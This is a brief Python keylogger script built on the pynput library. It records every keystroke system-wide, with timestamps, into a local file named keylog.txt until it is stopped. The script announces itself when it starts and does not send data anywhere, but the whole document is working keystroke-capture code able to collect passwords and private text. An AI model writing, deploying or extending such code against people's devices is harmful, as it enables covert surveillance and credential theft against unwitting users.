from pynput import keyboard
import time

def on_key_press(key):
    # Open log file in append mode
    with open("keylog.txt", "a") as log_file:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        try:
            # Handle printable characters
            log_file.write(f"{timestamp} - {key.char}\n")
        except AttributeError:
            # Handle special keys like space, enter, etc.
            log_file.write(f"{timestamp} - {key}\n")

def main():
    print("Key logging started. Press Ctrl+C to stop logging.")
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
